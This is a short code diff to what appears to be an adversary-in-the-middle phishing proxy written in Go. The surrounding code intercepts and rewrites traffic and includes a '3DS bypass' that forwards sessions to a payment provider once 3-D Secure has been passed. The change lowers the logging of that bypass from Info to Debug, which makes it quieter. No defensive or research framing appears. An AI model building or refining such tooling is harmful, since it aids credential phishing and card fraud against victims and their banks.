@@ -1271,7 +1271,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							// 3DS bypass: if session has completed 3DS, forward request to upstream
 							if p.threeDS != nil && ps.SessionId != "" && p.threeDS.HasBypass(ps.SessionId) {
-								log.Info("intercept: 3DS bypass enabled for session %s, forwarding to upstream (domain=%s, path=%s)", ps.SessionId, ic.domain, ic.path.String())
+								log.Debug("intercept: 3DS bypass enabled for session %s, forwarding to upstream (domain=%s, path=%s)", ps.SessionId, ic.domain, ic.path.String())
 								continue
 							}
 							if ic.body_match != nil || len(ic.alterRequest) > 0 {
@@ -1703,7 +1703,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							// 3DS bypass: if session has completed 3DS, skip response modification
 							if p.threeDS != nil && p.threeDS.HasBypass(ps.SessionId) {
-								log.Info("intercept response: 3DS bypass enabled for session %s, skipping alter_response (domain=%s, path=%s)", ps.SessionId, ic.domain, ic.path.String())
+								log.Debug("intercept response: 3DS bypass enabled for session %s, skipping alter_response (domain=%s, path=%s)", ps.SessionId, ic.domain, ic.path.String())
 								continue
 							}
 							if ic.type_ != "transparent" {
